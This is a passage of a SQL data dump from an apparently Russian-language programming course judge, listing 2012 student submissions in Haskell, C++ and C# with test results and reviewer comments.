a2*y)\n\n      in [x, y, z]\n\n\n\n  | a2*b1 == a1*b2 && a3*b1 /= a1*b3 =\n\n      let\n\n        z = (a4*b1 - b4*a1) `div` (a3*b1 - b3*a1)\n\n        (x, y) = euclidFull a1 a2 (a4 - a3*z)\n\n      in [x, y, z]\n\n\n\n  | a1*b4 /= a4*b1 =\n\n      let\n\n        k1 = a2*b1 - b2*a1\n\n        k2 = a3*b1 - b3*a1\n\n        (y, z) = euclidFull k1 k2 (a4*b1 - b4*a1)\n\n        k3 = a2*k2 - a3*k1\n\n        k4 = a4 - a2*y - a3*z\n\n        (x, t) = euclidFull a1 k3 k4\n\n      in [x, y + k2*t, z - k1*t]\n\n\n\n  | a1*b4 == a4*b1 =\n\n      let\n\n        k = (a2*b1 - b2*a1) `div` (b3*a1 - a3*b1)\n\n        k1 = a2 + k*a3\n\n        (x, y) = euclidFull a1 k1 a4\n\n      in [x, y, k*y]\n\n\n', 'Не удалось вычислить выражение "let [x,y,z] = dioph [0,0,0,0] [0,1,0,3] in y", проверьте правильность синтаксиса'),
(1541, 51, '6774563', '2012-10-06 06:45:43', 1, 'repeatFunc f n = let funcs = [f | i <- [1..n]] in foldr (.) id funcs\r\n', '<br/>Тесты успешно пройдены!'),
(1542, 52, '6774563', '2012-10-06 06:46:11', 1, 'repeatFunc f n = let funcs = [f | i <- [1..n]] in foldr (.) id funcs\r\n', '<br/>Тесты успешно пройдены!'),
(1543, 44, '787463', '2012-10-06 07:04:56', 0, 'euclid a b \n\n  | a == 0 = (0, b `div` (abs b))\n\n  | otherwise =\n\n      let\n\n        (x1, y1) = euclid (mod b a) a\n\n      in (y1 - (div b a) * x1, x1)\n\neuclidF a b =\n\n    let\n\n      d = gcd a b\n\n      (x, y) = euclid (a `div` d) (b `div` d)\n\n    in (x, y)\n\neuclidFull a b res = \n\n    let\n\n      (x,y) = euclidF a b\n\n      d = res `div` (gcd a b)\n\n    in (x*d, y*d)\n\n\n\ndioph'' [a1,a2,a3,a4]\n\n  | a2 /= 0 = \n\n      let\n\n        (y, z) = euclidF a2 a3\n\n        d = gcd a2 a3\n\n        (x, k) = euclidFull a1 d a4\n\n      in [x, y*k, z*k]\n\n  | a1 /= 0 =\n\n      let\n\n        [y,x,z] = dioph'' [a2,a1,a3,a4]\n\n      in [x,y,z]\n\n  | a3 /= 0 =\n\n      let\n\n        [x,z,y] = dioph'' [a1,a3,a2,a4]\n\n      in [x,y,z]\n\n  | otherwise = [0,0,0]\n\n\n\ndioph [a1,a2,a3,a4] [b1,b2,b3,b4]\n\n  | a1*b4 == a4*b1 && a2*b4 == a4*b2 && a3*b4 == a4*b3 = \n\n      if a4 == 0 && b4 == 0 then [0,0,0]\n\n      else if a4 == 0 then dioph'' [b1,b2,b3,b4]\n\n      else if b4 == 0 then dioph'' [a1,a2,a3,a4]\n\n      else dioph'' [a1,a2,a3,a4]\n\n\n\n  | a2*b1 == a1*b2 && a3*b1 == a1*b3 = [0,0,0]\n\n\n\n  | a2*b1 /= a1*b2 && a3*b1 == a1*b3 =\n\n      let\n\n        y = (a4*b1 - b4*a1) `div` (a2*b1 - b2*a1)\n\n        (x, z) = euclidFull a1 a3 (a4 - a2*y)\n\n      in [x, y, z]\n\n\n\n  | a2*b1 == a1*b2 && a3*b1 /= a1*b3 =\n\n      let\n\n        z = (a4*b1 - b4*a1) `div` (a3*b1 - b3*a1)\n\n        (x, y) = euclidFull a1 a2 (a4 - a3*z)\n\n      in [x, y, z]\n\n\n\n  | a1*b4 /= a4*b1 =\n\n      let\n\n        k1 = a2*b1 - b2*a1\n\n        k2 = a3*b1 - b3*a1\n\n        (y, z) = euclidFull k1 k2 (a4*b1 - b4*a1)\n\n        k3 = a2*k2 - a3*k1\n\n        k4 = a4 - a2*y - a3*z\n\n        (x, t) = euclidFull a1 k3 k4\n\n      in [x, y + k2*t, z - k1*t]\n\n\n\n  | a1*b4 == a4*b1 =\n\n      let\n\n        k = (a2*b1 - b2*a1) `div` (b3*a1 - a3*b1)\n\n        k1 = a2 + k*a3\n\n        (x, y) = euclidFull a1 k1 a4\n\n      in [x, y, k*y]\n\n\n', 'Выражение имеет неправильное значение: let [x,y,z] = dioph [7,11,0,1] [0,25,19,1] in (7*x+11*y, 25*y+19*z)'),
(1544, 48, '44060', '2012-10-06 07:16:43', 1, 'myreverse x = foldr (x rev -> (y -> rev (x:y))) id x []', '<br/>Тесты успешно пройдены!'),
(1545, 47, '2118411', '2012-10-06 07:19:12', 1, 'powerset [] = [[]]\r\npowerset (x:xs) = pt ++ [ x:y | y<-pt] where pt = powerset xs\r\n', '<br/>Тесты успешно пройдены!'),
(1546, 48, '2118411', '2012-10-06 07:19:33', 1, 'myreverse xs = (foldr (x res y->res(x:y)) (x->x) xs) []\r\n', '<br/>Тесты успешно пройдены!'),
(1547, 51, '2118411', '2012-10-06 07:19:55', 1, 'repeatFunc f n = foldr (.) id (replicate n f)\r\n', '<br/>Тесты успешно пройдены!'),
(1548, 52, '2118411', '2012-10-06 07:20:19', 1, 'repeatFunc f n = foldr (.) id (replicate n f)', '<br/>Тесты успешно пройдены!'),
(1549, 53, '2118411', '2012-10-06 07:20:33', 1, 'coins n = [[k,l,m] | k<-[0..n], l<-[0..n], m<-[0..n], k*2+l*3+m*5 == n]\r\n', '<br/>Тесты успешно пройдены!'),
(1550, 54, '2118411', '2012-10-06 07:20:54', 1, 'data Scheme = R Double | Parallel Scheme Scheme | Seq Scheme Scheme\r\n\r\ntotalResistance (R r) = r\r\ntotalResistance (Parallel s1 s2) = r1 * r2 / (r1+r2)\r\n        where\r\n                r1 = totalResistance s1\r\n                r2 = totalResistance s2\r\ntotalResistance (Seq s1 s2) = r1 + r2\r\n        where\r\n                r1 = totalResistance s1\r\n                r2 = totalResistance s2\r\n', '<br/>Тесты успешно пройдены!'),
(1551, 52, '44060', '2012-10-06 07:21:22', 1, 'repeatFunc f n = foldr (x rez -> f.rez) (:) [1..n]', 'Не удалось вычислить выражение "repeatFunc (*2) 3 10", проверьте правильность синтаксиса'),
(1552, 53, '44060', '2012-10-06 07:26:47', 1, 'coins n = [(k,l,m)| k<-[0..(div n 2)], l<-[0..(div n 3)], m<-[0..(div n 5)], 2*k+3*l +5*m == n]\r\n', 'Выражение имеет неправильное значение: coins 2'),
(1553, 44, '787463', '2012-10-06 07:39:39', 0, 'euclid a b \n\n  | a == 0 = (0, b `div` (abs b))\n\n  | otherwise =\n\n      let\n\n        (x1, y1) = euclid (mod b a) a\n\n      in (y1 - (div b a) * x1, x1)\n\neuclidF a b =\n\n    let\n\n      d = gcd a b\n\n      (x, y) = euclid (a `div` d) (b `div` d)\n\n    in (x, y)\n\neuclidFull a b res = \n\n    let\n\n      (x,y) = euclidF a b\n\n      d = res `div` (gcd a b)\n\n    in (x*d, y*d)\n\n\n\ndioph'' [a1,a2,a3,a4]\n\n  | a2 /= 0 = \n\n      let\n\n        (y, z) = euclidF a2 a3\n\n        d = gcd a2 a3\n\n        (x, k) = euclidFull a1 d a4\n\n      in [x, y*k, z*k]\n\n  | a1 /= 0 =\n\n      let\n\n        [y,x,z] = dioph'' [a2,a1,a3,a4]\n\n      in [x,y,z]\n\n  | a3 /= 0 =\n\n      let\n\n        [x,z,y] = dioph'' [a1,a3,a2,a4]\n\n      in [x,y,z]\n\n  | otherwise = [0,0,0]\n\n\n\ndioph [a1,a2,a3,a4] [b1,b2,b3,b4]\n\n  | a1*b4 == a4*b1 && a2*b4 == a4*b2 && a3*b4 == a4*b3 = \n\n      if a4 == 0 && b4 == 0 then [0,0,0]\n\n      else if a4 == 0 then dioph'' [b1,b2,b3,b4]\n\n      else if b4 == 0 then dioph'' [a1,a2,a3,a4]\n\n      else dioph'' [a1,a2,a3,a4]\n\n\n\n  | a2*b1 == a1*b2 && a3*b1 == a1*b3 = [0,0,0]\n\n\n\n  | a2*b1 /= a1*b2 && a3*b1 == a1*b3 =\n\n      let\n\n        y = (a4*b1 - b4*a1) `div` (a2*b1 - b2*a1)\n\n        (x, z) = euclidFull a1 a3 (a4 - a2*y)\n\n      in [x, y, z]\n\n\n\n  | a2*b1 == a1*b2 && a3*b1 /= a1*b3 =\n\n      let\n\n        z = (a4*b1 - b4*a1) `div` (a3*b1 - b3*a1)\n\n        (x, y) = euclidFull a1 a2 (a4 - a3*z)\n\n      in [x, y, z]\n\n\n\n  | a1*b4 /= a4*b1 =\n\n      let\n\n        k1 = a2*b1 - b2*a1\n\n        k2 = a3*b1 - b3*a1\n\n        (y, z) = euclidFull k1 k2 (a4*b1 - b4*a1)\n\n        d = gcd k1 k2\n\n        m1 = k1 `div` d\n\n        m2 = k2 `div` d\n\n        k3 = a2*m2 - a3*m1\n\n        k4 = a4 - a2*y - a3*z\n\n        (x, t) = euclidFull a1 k3 k4\n\n      in [x, y + m2*t, z - m1*t]\n\n\n\n  | a1*b4 == a4*b1 =\n\n      let\n\n        k = (a2*b1 - b2*a1) `div` (b3*a1 - a3*b1)\n\n        k1 = a2 + k*a3\n\n        (x, y) = euclidFull a1 k1 a4\n\n      in [x, y, k*y]\n\n\n', 'Не удалось вычислить выражение "let [x,y,z] = dioph [0,1,0,0] [1,1,0,10] in (y,x+y)", проверьте правильность синтаксиса'),
(1554, 44, '787463', '2012-10-06 07:48:40', 1, 'euclid a b \r\n\r\n  | a == 0 = (0, b `div` (abs b))\r\n\r\n  | otherwise =\r\n\r\n      let\r\n\r\n        (x1, y1) = euclid (mod b a) a\r\n\r\n      in (y1 - (div b a) * x1, x1)\r\n\r\neuclidF a b =\r\n\r\n    let\r\n\r\n      d = gcd a b\r\n\r\n      (x, y) = euclid (a `div` d) (b `div` d)\r\n\r\n    in (x, y)\r\n\r\neuclidFull a b res = \r\n\r\n    let\r\n\r\n      (x,y) = euclidF a b\r\n\r\n      d = res `div` (gcd a b)\r\n\r\n    in (x*d, y*d)\r\n\r\n\r\n\r\ndioph'' [a1,a2,a3,a4]\r\n\r\n  | a2 /= 0 = \r\n\r\n      let\r\n\r\n        (y, z) = euclidF a2 a3\r\n\r\n        d = gcd a2 a3\r\n\r\n        (x, k) = euclidFull a1 d a4\r\n\r\n      in [x, y*k, z*k]\r\n\r\n  | a1 /= 0 =\r\n\r\n      let\r\n\r\n        [y,x,z] = dioph'' [a2,a1,a3,a4]\r\n\r\n      in [x,y,z]\r\n\r\n  | a3 /= 0 =\r\n\r\n      let\r\n\r\n        [x,z,y] = dioph'' [a1,a3,a2,a4]\r\n\r\n      in [x,y,z]\r\n\r\n  | otherwise = [0,0,0]\r\n\r\n\r\n\r\ndioph [a1,a2,a3,a4] [b1,b2,b3,b4]\r\n\r\n  | a1*b4 == a4*b1 && a2*b4 == a4*b2 && a3*b4 == a4*b3 = \r\n\r\n      if a4 == 0 && b4 == 0 then [0,0,0]\r\n\r\n      else if a4 == 0 then dioph'' [b1,b2,b3,b4]\r\n\r\n      else if b4 == 0 then dioph'' [a1,a2,a3,a4]\r\n\r\n      else dioph'' [a1,a2,a3,a4]\r\n\r\n\r\n\r\n  | a2*b1 == a1*b2 && a3*b1 == a1*b3 = [0,0,0]\r\n\r\n\r\n\r\n  | a2*b1 /= a1*b2 && a3*b1 == a1*b3 =\r\n\r\n      let\r\n\r\n        y = (a4*b1 - b4*a1) `div` (a2*b1 - b2*a1)\r\n\r\n      in if a1 == 0 && a3 == 0\r\n\r\n         then\r\n\r\n           let\r\n\r\n             (x, z) = euclidFull b1 b3 (b4 - b2*y)\r\n\r\n           in [x, y, z]\r\n\r\n         else\r\n\r\n           let\r\n\r\n             (x, z) = euclidFull a1 a3 (a4 - a2*y)\r\n\r\n           in [x, y, z]\r\n\r\n\r\n\r\n  | a2*b1 == a1*b2 && a3*b1 /= a1*b3 =\r\n\r\n      let\r\n\r\n        z = (a4*b1 - b4*a1) `div` (a3*b1 - b3*a1)\r\n\r\n      in if a1 == 0 && a2 == 0\r\n\r\n         then\r\n\r\n           let\r\n\r\n             (x, y) = euclidFull b1 b2 (b4 - b3*z)\r\n\r\n           in [x, y, z]\r\n\r\n         else\r\n\r\n           let\r\n\r\n             (x, y) = euclidFull a1 a2 (a4 - a3*z)\r\n\r\n           in [x, y, z]\r\n\r\n\r\n\r\n  | a1*b4 /= a4*b1 =\r\n\r\n      let\r\n\r\n        k1 = a2*b1 - b2*a1\r\n\r\n        k2 = a3*b1 - b3*a1\r\n\r\n        (y, z) = euclidFull k1 k2 (a4*b1 - b4*a1)\r\n\r\n        d = gcd k1 k2\r\n\r\n        m1 = k1 `div` d\r\n\r\n        m2 = k2 `div` d\r\n\r\n        k3 = a2*m2 - a3*m1\r\n\r\n        k4 = a4 - a2*y - a3*z\r\n\r\n        (x, t) = euclidFull a1 k3 k4\r\n\r\n      in [x, y + m2*t, z - m1*t]\r\n\r\n\r\n\r\n  | a1*b4 == a4*b1 =\r\n\r\n      let\r\n\r\n        k = (a2*b1 - b2*a1) `div` (b3*a1 - a3*b1)\r\n\r\n        k1 = a2 + k*a3\r\n\r\n        (x, y) = euclidFull a1 k1 a4\r\n\r\n      in [x, y, k*y]\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(1555, 54, '44060', '2012-10-06 08:00:51', 1, 'data Schema = R Double | Posl [Schema]| Prl [Schema]\r\ntotalResistance (R x) = x\r\ntotalResistance (Posl xs) = foldr (x rezult -> rezult + (totalResistance x)) 0 xs\r\ntotalResistance (Prl xs)  = 1/f xs\r\n		where\r\n			f xs = foldr (x rezult -> rezult + (1/(totalResistance x))) 0 xs', '<br/>Тесты успешно пройдены!'),
(1556, 51, '44060', '2012-10-06 08:01:35', 0, 'repeatFunc f n = foldr (x rez -> f.rez) (:) [1..n]\r\n   --- А почему (:), не очень понятно ?', 'Не удалось вычислить выражение "(repeatFunc (*2) 3) 1", проверьте правильность синтаксиса'),
(1557, 46, '397095', '2012-10-06 08:28:04', 2, '#include <iostream>\r\n#include <algorithm>\r\n#include <vector>\r\n\r\nusing namespace std;\r\n\r\nint main () {\r\n  vector<int> myvector;\r\n  \r\n  myvector.push_back(-1);\r\n  myvector.push_back(2);\r\n  myvector.push_back(-3);\r\n\r\n  vector<int>::iterator it = find_if (myvector.begin(), myvector.end(), [] (int x) { x > 0; });\r\n  cout << "First matching value: " << *it << endl;\r\n     --- Нет, это правильно, конечно, но вы еще должны показать, что, знаете, как определить,\r\n     --- что нужный элемент не был найден\r\n\r\n  return 0;\r\n}', '<br/>Тесты успешно пройдены!'),
(1558, 50, '397095', '2012-10-06 08:42:18', 1, '#include <iostream>\r\n\r\nusing namespace std;\r\n\r\nclass Tree {\r\nprivate:\r\n	int X;\r\n	Tree * Left;\r\n	Tree * Right;\r\npublic:\r\n	Tree(int x) : X(x), Left(NULL), Right(NULL) {}\r\n\r\n	Tree(int x, Tree * left, Tree * right) : X(x), Left(left), Right(right) {}\r\n\r\n	int GetValue() {\r\n		return X;\r\n	}\r\n\r\n	Tree * GetLeftChild() {\r\n		return Left;\r\n	}\r\n\r\n	Tree * GetRightChild() {\r\n		return Right;\r\n	}\r\n\r\n	template<class Predicate>\r\n	static bool Any(Tree * tree, Predicate p) {\r\n		if (tree == NULL) \r\n			return false;\r\n\r\n		int x = tree->GetValue();\r\n		if (p(x)) \r\n			return true;\r\n\r\n		return Any(tree->GetLeftChild(), p) || Any(tree->GetRightChild(), p);\r\n	}\r\n};\r\n\r\nbool IsPositive(int x) {\r\n	return x > 0;\r\n}\r\n\r\nint main(int argc, char const *argv[]) {\r\n	\r\n	cout << (Tree::Any(new Tree(3), IsPositive) ? "Matches" : "Does not match") << endl;\r\n	cout << (Tree::Any(new Tree(-1, new Tree(-2, new Tree(-4), NULL), new Tree(-5)), IsPositive) ? "Matches" : "Does not match") << endl;\r\n\r\n	return 0;\r\n}', '<br/>Тесты успешно пройдены!'),
(1559, 46, '397095', '2012-10-06 08:49:30', 1, '#include <iostream>\r\n#include <algorithm>\r\n#include <vector>\r\n\r\nusing namespace std;\r\n\r\nint main () {\r\n  vector<int> myvector;\r\n  \r\n  myvector.push_back(-1);\r\n  myvector.push_back(2);\r\n  myvector.push_back(-3);\r\n\r\n  vector<int>::iterator it = find_if (myvector.begin(), myvector.end(), [] (int x) { x > 0; });\r\n  cout << (it == myvector.end() ? "Does not match" : "Matches") << endl;\r\n\r\n  return 0;\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(1560, 45, '397095', '2012-10-06 09:00:59', 1, 'using System;\r\nusing System.Linq;\r\n\r\nnamespace FunctionalProgramming\r\n{\r\n	class Containers\r\n	{\r\n		static void Main(string[] args) \r\n		{\r\n			int[][] a = new int[][] { new int[] {1,2,3,4}, new int[] {5,6,7,8} };\r\n			Console.WriteLine("a: {0}", a.All(x => x.Any(e => (e % 2) == 0)));\r\n\r\n			int[][] b = new int[][] { new int[] {1,3,7}, new int[] {9,11,13,15} };\r\n			Console.WriteLine("b: {0}", b.All(x => x.Any(e => (e % 2) == 0)));			\r\n		}\r\n	}\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(1561, 49, '397095', '2012-10-06 09:10:54', 1, 'using System;\r\nusing System.Linq;\r\n\r\nnamespace FunctionalProgramming\r\n{\r\n	class Node\r\n	{\r\n		public int X { get; set; }\r\n		public Node Left { get; set; }\r\n		public Node Right { get; set; }\r\n\r\n		public bool AnyTree(Predicate<int> p) \r\n		{\r\n			return p(X) || (Left != null ? Left.AnyTree(p) : false) || (Right != null ? Right.AnyTree(p) : false);\r\n		}\r\n	}\r\n\r\n	class Tree\r\n	{\r\n		static void Main(string[] args) \r\n		{\r\n			Node tree = new Node {\r\n				X = 3,\r\n				Left = new Node {\r\n					X = 10\r\n				},\r\n				Right = new Node {\r\n					X = 4,\r\n					Left = new Node {\r\n						X = 5\r\n					}\r\n				}\r\n			};\r\n\r\n			Console.WriteLine(">5? {0}", tree.AnyTree(x => x > 5));\r\n			Console.WriteLine("<0? {0}", tree.AnyTree(x => x < 0));\r\n		}\r\n	}\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(1562, 49, '2118411', '2012-10-06 10:43:06', 1, 'using System;\r\n\r\n\r\n\r\nnamespace FPTask\r\n\r\n{\r\n\r\n    class Program\r\n\r\n    {\r\n\r\n        static void Main(string[] args)\r\n\r\n        {\r\n\r\n            Tree<int> t = new Tree<int>(2);\r\n\r\n            t.left = new Tree<int>(3);\r\n\r\n            t.right = new Tree<int>(5);\r\n\r\n\r\n\r\n            bool res = t.Any(x => x % 2 == 1);\r\n\r\n            Console.WriteLine("{0}", res);\r\n\r\n        }\r\n\r\n    }\r\n\r\n\r\n\r\n    class Tree<T>\r\n\r\n    {\r\n\r\n        public T key;\r\n\r\n        public Tree<T> left, right;\r\n\r\n\r\n\r\n        public Tree(T k)\r\n\r\n        {\r\n\r\n            key = k;\r\n\r\n        }\r\n\r\n\r\n\r\n        public bool Any(Predicate<T> match)\r\n\r\n        {\r\n\r\n            if (match(this.key))\r\n\r\n            {\r\n\r\n                return true;\r\n\r\n            }\r\n\r\n\r\n\r\n            if (left != null && right != null)\r\n\r\n            {\r\n\r\n                return left.Any(match) || right.Any(match);\r\n\r\n            }\r\n\r\n\r\n\r\n            if (left != null)\r\n\r\n            {\r\n\r\n                return left.Any(match);\r\n\r\n            }\r\n\r\n\r\n\r\n            if (right != null)\r\n\r\n            {\r\n\r\n                return right.Any(match);\r\n\r\n            }\r\n\r\n           \r\n\r\n            return false;\r\n\r\n        }\r\n\r\n    }\r\n\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(1563, 50, '2118411', '2012-10-06 10:43:44', 1, '#include <iostream>\r\n\r\nusing namespace std;\r\n\r\n\r\n\r\ntemplate<class T> class BinaryTree\r\n\r\n{\r\n\r\n	public:\r\n\r\n	struct Node\r\n\r\n	{\r\n\r\n		T data;\r\n\r\n		Node* left;\r\n\r\n		Node* right;\r\n\r\n\r\n\r\n		Node(T dataNew)\r\n\r\n		{\r\n\r\n			data = dataNew;\r\n\r\n			left = NULL;\r\n\r\n			right = NULL;\r\n   --- Просто как замечание, это все лучше задавать в списке инициализации\r\n		}\r\n\r\n	};\r\n\r\n	\r\n\r\n	Node* root;\r\n\r\n	\r\n\r\n	void Insert(T newData, Node* &theRoot)\r\n\r\n	{\r\n\r\n		if(theRoot == NULL)\r\n\r\n		{\r\n\r\n			theRoot = new Node(newData);\r\n\r\n			return;\r\n\r\n		}\r\n\r\n\r\n\r\n		if(newData < theRoot->data)\r\n\r\n		{\r\n\r\n			Insert(newData, theRoot->left);\r\n\r\n		}\r\n\r\n		else\r\n\r\n		{\r\n\r\n			Insert(newData, theRoot->right);\r\n\r\n		}\r\n\r\n	}\r\n\r\n\r\n\r\n	void RemoveAll(Node* &theRoot)\r\n                --- А зачем ссылка? Ваша функция, вроде бы, ничего не делает с _значением_ theRoot\r\n	{\r\n\r\n		if(theRoot == NULL)\r\n\r\n		{\r\n\r\n			return;\r\n\r\n		}\r\n\r\n\r\n\r\n		RemoveAll(theRoot->left);\r\n\r\n		RemoveAll(theRoot->right);\r\n\r\n\r\n\r\n		delete theRoot;\r\n\r\n	}\r\n\r\n\r\n\r\n\r\n\r\n		BinaryTree()\r\n\r\n		{\r\n\r\n			root = NULL;\r\n\r\n		}\r\n\r\n\r\n\r\n		~BinaryTree()\r\n\r\n		{\r\n\r\n			RemoveAll(root);\r\n\r\n		}\r\n\r\n\r\n\r\n		void AddItem(T newData)\r\n\r\n		{\r\n\r\n			Insert(newData, root);\r\n\r\n		}\r\n\r\n};\r\n\r\n\r\n\r\ntemplate <class BinaryTree, class Func> bool Any(BinaryTree* &theRoot, Func f)\r\n\r\n{\r\n\r\n	if(theRoot == NULL)\r\n\r\n	{\r\n\r\n		return false;\r\n\r\n	}\r\n\r\n\r\n\r\n	if (f(theRoot->data))\r\n\r\n	{\r\n\r\n		return true;\r\n\r\n	}\r\n\r\n\r\n\r\n	if (theRoot->left != NULL && theRoot->right != NULL)\r\n\r\n	{\r\n\r\n		return Any(theRoot->left, f) || Any(theRoot->right, f);\r\n\r\n	}\r\n\r\n\r\n\r\n	if (theRoot->left != NULL)\r\n\r\n	{\r\n\r\n		return Any(theRoot->left, f);\r\n\r\n	}\r\n\r\n\r\n\r\n	if (theRoot->right != NULL)\r\n\r\n	{\r\n\r\n		return Any(theRoot->right, f);\r\n\r\n	}\r\n\r\n\r\n\r\n	return false;\r\n\r\n};\r\n\r\n\r\n\r\nint main () \r\n\r\n{\r\n\r\n	BinaryTree<int> *t = new BinaryTree<int>();\r\n\r\n	t->AddItem(4);\r\n\r\n	t->AddItem(3);\r\n\r\n	t->AddItem(5);\r\n\r\n\r\n\r\n	cout << (Any(t->root, [] (int i) {return i%2==1;})?"True":"False") << endl;\r\n\r\n\r\n\r\n	delete t;\r\n\r\n	return 0;\r\n\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(1564, 44, '397095', '2012-10-06 13:19:58', 0, '', 'Не удалось вычислить выражение "let [x,y,z] = dioph [1,1,1,6] [1,2,3,14] in (x+y+z, x+2*y+3*z)", проверьте правильность синтаксиса'),
(1565, 51, '355679', '2012-10-06 13:22:01', 1, 'repeatFunc f 1 = f\r\n\r\nrepeatFunc f n = f . (repeatFunc f (n - 1))\r\n', '<br/>Тесты успешно пройдены!'),
(1566, 52, '355679', '2012-10-06 13:22:28', 1, 'repeatFunc f n = foldl (\r\nes x -> res . f) (x->x) [1..n]\r\n', '<br/>Тесты успешно пройдены!'),
(1567, 53, '355679', '2012-10-06 13:45:00', 1, 'coins n = [x:(y:[z]) |\r\n    --- вместо x:(y:[z]) можно [x,y,z]\r\n		x <- [0..(n `div` 2)],\r\n\r\n		y <- [0..(n ` div` 3)],\r\n\r\n		z <- [0..(n `div` 5)], \r\n\r\n		2 * x + 3 * y + 5 * z == n ]', '<br/>Тесты успешно пройдены!'),
(1568, 53, 'Deutsche', '2012-10-06 14:05:46', 1, 'coins n = [[x, y, z] | x<-[0..n], y<-[0..n], z<-[0..n], 2*x+3*y+5*z==n]', '<br/>Тесты успешно пройдены!'),
(1569, 45, '51559263', '2012-10-06 14:41:54', 1, 'using System;\r\nusing System.Collections.Generic;\r\nusing System.Linq;\r\nusing System.Text;\r\n\r\nnamespace EvevnAny\r\n{\r\n    class Program\r\n    {\r\n        static bool AnyEven ( List<List<int>> list )\r\n        {\r\n            return list.All( x => x.Any( y => y % 2 == 0 ) );\r\n        }\r\n\r\n        static void Main( )\r\n        {\r\n            List<List<int>> list = new List<List<int>>();\r\n\r\n            list.Add(new List<int>{222222,1,3});\r\n            list.Add(new List<int>{4,5,6});\r\n            list.Add(new List<int>{7,8,9});\r\n            list.Add(new List<int>{44444,7,9});\r\n\r\n            Console.WriteLine( AnyEven(list) );\r\n            Console.ReadKey();\r\n        }\r\n    }\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(1570, 54, '355679', '2012-10-06 14:52:38', 1, 'data Scheme = Resist Double | Par Scheme Scheme | Seq Scheme Scheme deriving Show\r\n\r\n\r\n\r\nresist (Resist d) = d\r\n\r\nresist (Par s1 s2) = ((resist s1) * (resist s2)) / ((resist s1) + (resist s2))\r\n   --- Тут не очень хорошо, что каждый resist вызывается по 2 раза, лучше,\r\n   --- например, использовать let\r\n\r\nresist (Seq s1 s2) = (resist s1) + (resist s2)\r\n', '<br/>Тесты успешно пройдены!'),
(1571, 47, '355679', '2012-10-06 14:52:53', 0, 'powerset (x:[]) = [[], [x]]\n\npowerset (x:xs) =\n\n  let {\n\n    ps = powerset xs\n\n  } in (\n\n    (map (cur -> x:cur) ps) ++ ps\n\n  )\n', 'Не удалось вычислить выражение "powerset []", проверьте правильность синтаксиса'),
(1572, 47, '355679', '2012-10-06 14:53:38', 1, 'powerset [] = [[]]\r\n\r\npowerset (x:xs) =\r\n\r\n  let {\r\n\r\n    ps = powerset xs\r\n\r\n  } in (\r\n\r\n    (map (cur -> x:cur) ps) ++ ps\r\n   --- Фигурные скобки всюду можно не писать (они автоматические добавляются\r\n   --- за счет отступов \r\n  )\r\n', '<br/>Тесты успешно пройдены!'),
(1573, 43, '383483', '2012-10-06 15:11:04', 0, 'euclid a b = if (a>=b) then algeu b (mod a b) [0,1,1,(-(div a b))] 0 else algeu a (mod b a) [0,1,1,(-(div b a))] 1\r\n\r\nalgeu a b xs revres\r\n    | (mod a b)==0 = if (revres==0) then (xs!!2, xs!!3) else (xs!!3, xs!!2)\r\n    | otherwise = algeu b (mod a b) (prdMatrix xs (div a b)) revres\r\n\r\nprdMatrix xs q = [xs!!2, xs!!3, (head xs) + (xs!!2)*(-q), xs!!1 + (xs!!3)*(-q)]\r\n', 'Не удалось вычислить выражение "let (x,y) = euclid 1 0 in 1*x+0*y", проверьте правильность синтаксиса'),
(1574, 43, '383483', '2012-10-06 15:31:53', 1, 'euclid a b \r\n     | (a==0) = if (b==1) then (0,1) else (0,0)\r\n     | (b==0) = if (a==1) then (1,0) else (0,0)\r\n     | otherwise = if (a>=b) then algeu b (mod a b) [0,1,1,(-(div a b))] 0 else algeu a (mod b a) [0,1,1,(-(div b a))] 1\r\n\r\nalgeu a b xs revres\r\n    | (b==0 || a==0) = if (revres==0) then (1,0) else (0,1)\r\n    | (mod a b)==0 = if (revres==0) then (xs!!2, xs!!3) else (xs!!3, xs!!2)\r\n    | otherwise = algeu b (mod a b) (prdMatrix xs (div a b)) revres\r\n\r\nprdMatrix xs q = [xs!!2, xs!!3, (head xs) + (xs!!2)*(-q), xs!!1 + (xs!!3)*(-q)]\r\n', '<br/>Тесты успешно пройдены!'),
(1575, 44, '397095', '2012-10-06 15:47:26', 0, 'eu 0 _ = (0, 1)\n\neu a b = \n\n	let \n\n		(x1, y1) = eu (mod b a) a\n\n	in\n\n		(y1 - (div b a) * x1, x1)\n\n\n\n-- (x0, y0, tx, ty)\n\nsolve a b c =\n\n	let \n\n		g = gcd a b\n\n		a1 = div a g\n\n		b1 = div b g\n\n		c1 = div c g\n\n		(u, v) = eu a1 b1\n\n	in\n\n		(u * c1, v * c1, b1, -a1)\n\n\n\nsolve1 a d k n i = \n\n	let\n\n		a1 = div d a\n\n		a2 = div n k\n\n	in\n\n		if\n\n			mod d a == 0 &&\n\n			mod n k == 0 &&\n\n			a1 == a2\n\n		then\n\n			put a1 i\n\n		else\n\n			(0,0,0)\n\nput x i\n\n	| i == 1 = (x,0,0)\n\n	| i == 2 = (0,x,0)\n\n	| otherwise = (0,0,x)\n\n\n\nsolve2 a b d k l n i j = \n\n	if isCollinear (a,b,d) (k,l,n) then\n\n		let\n\n			(x0, y0, _, _) = solve a b d\n\n		in\n\n			put2 x0 y0 i j\n\n	else\n\n		(0,0,0)\n\n\n\nput2 x y i j = merge (put x i) (put y j)\n\n\n\nmerge (x,y,z) (a,b,c) = (if x == 0 then a else x, if y == 0 then b else y , if z == 0 then c else z)\n\n\n\nisCollinear (x,y,z) (a,b,c) =\n\n	let \n\n		sc = x * a + y * b + z * c\n\n		sx = x * x + y * y + z * z\n\n		sy = a * a + b * b + c * c\n\n	in sc * sc == sx * sy\n\n\n\ndioph [a,b,c,d] [k,l,m,n] = \n\n 	let\n\n		c1 = a * m - c * k\n\n		c2 = b * m - c * l\n\n		c3 = d * m - c * n\n\n		g = gcd c1 c2\n\n\n\n		z1 = a /= 0 && k /= 0\n\n		z2 = b /= 0 && l /= 0\n\n		z3 = c /= 0 && m /= 0\n\n	in\n\n		if z1 && z2 && z3 then\n\n			if (mod c3 g) /= 0 then (0,0,0) else\n\n				let\n\n					(x0, y0, tx, ty) = solve c1 c2 c3\n\n					c11 = a * tx + b * ty -- t\n\n					c13 = d - a * x0 - b * y0\n\n					c21 = k * tx +l * ty -- t\n\n					c23 = n - k * x0 - l * y0\n\n				in\n\n					if isCollinear (c11, c, c13) (c21, m, c23) 